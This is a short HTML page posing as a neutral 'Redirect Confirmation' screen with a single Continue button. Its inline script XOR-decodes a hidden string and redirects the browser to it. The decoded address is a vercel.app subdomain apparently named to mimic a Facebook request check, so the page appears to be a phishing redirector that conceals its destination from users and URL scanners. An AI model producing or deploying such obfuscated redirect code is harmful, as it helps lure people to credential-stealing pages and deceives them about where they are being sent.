
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirect Confirmation</title>
  <style>
    body {
      background-color: #f4f6f8;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #ffffff;
      padding: 2rem 2.5rem;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
      text-align: center;
      max-width: 420px;
      width: 100%;
    }
    h2 {
      color: #2563eb;
      font-size: 1.4rem;
      margin-bottom: 0.75rem;
    }
    p {
      color: #555;
      font-size: 0.95rem;
      margin: 0;
    }
    button {
      margin-top: 1.8rem;
      padding: 0.75rem 2rem;
      font-size: 1rem;
      font-weight: 600;
      color: #fff;
      background-color: #2563eb;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.25s ease;
    }
    button:hover {
      background-color: #1d4ed8;
    }
  </style>
  <script>
    function xorDecode(encoded, key) {
      let decoded = "";
      for (let i = 0; i < encoded.length; i++) {
        decoded += String.fromCharCode(encoded.charCodeAt(i) ^ key);
      }
      return decoded;
    }

    function redirect() {
      const encoded = "a}}yz3&&jaljb{lx|lz}ok>=8$;eoj'\u007fl{jle'hyy&a}j}'}`b&yhnl'a}de";
      const url = xorDecode(encoded, 9);
      window.location.href = url;
    }
  </script>
</head>
<body>
  <div class="container">
    <h2>Redirect Confirmation</h2>
    <p>Please click the button below to continue.</p>
    <button onclick="redirect()">Continue</button>
  </div>
</body>
</html>
